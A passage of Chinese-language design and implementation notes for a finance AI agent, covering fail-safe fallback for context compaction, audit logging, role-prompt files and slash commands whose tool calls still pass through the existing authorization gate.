**fail-safe 是硬要求**：提取、生成、拼接任一步出问题都返回 `undefined`，回落 pi 自带摘要。
压缩失败会让整个回合失败，这段增强绝不能成为新的失败源。测试 K-3 直接让生成器抛错，
断言必须回落。

审计（§8 欠账）一并补上：每次压缩记结构化日志（reason、tokensBefore、消息数、提取到的
金额/期间/口径条数）。**不发新的运行时事件**——`compaction_completed` 已由 event-mapper
从 pi 的压缩事件发出，再发一条会双计（D8：事件合同不变）。

## 15. 角色提示词与 L7/L9 实施记录（2026-08-03，已 ship）

- 角色提示词落在 `lib/agent/roles/prompts/<roleId>.md`，便于单独编辑、审阅和后续随插件分发；
  旧注册表文本暂作完整约束回落，避免打包或旧安装缺少文件时静默丢失角色边界。
- 专员动态上下文由 `buildSpecialistDynamicSystemContext` 统一生成：当前日期/财务日历、全局
  记忆、角色专属记忆和会话输出目录均每回合刷新。
- L7 注册 `/checkpoint`、`/branch`、`/return`，复用 Pi session tree 的标签、分支和导航能力。
- L9 注册 `/月结`、`/对账`、`/凭证`，命令只提供稳定工作流入口，实际工具调用与确认仍走 Finwork
  的既有工具目录和授权闸。
- L5 InteractiveMode 按用户决定暂不实现。
